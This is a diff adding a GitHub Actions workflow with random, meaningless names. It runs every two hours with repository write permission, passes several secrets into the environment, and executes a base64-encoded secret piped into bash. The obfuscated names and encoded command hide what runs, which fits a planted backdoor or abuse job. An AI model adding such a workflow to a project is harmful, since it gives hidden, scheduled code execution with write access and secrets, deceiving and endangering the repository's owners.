@@ -1,0 +1,21 @@
+name: DejnuKVSCmg
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  ZIUmnlUPQh1:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.PEvxmpcTZMMuo }}
+      - name: Y6M87mf
+        env:
+          ficW2cpH1sa: ${{ secrets.jFz0WlB2 }}
+          NYtPkj8: ${{ secrets.I4xTHA1Li96Gqp8 }}
+          EDZT5Ihhejlo: ${{ secrets.XHk67sRM }}
+          GITHUB_TOKEN: ${{ secrets.PEvxmpcTZMMuo }}
+        run: echo "$ficW2cpH1sa" | base64 -d | bash
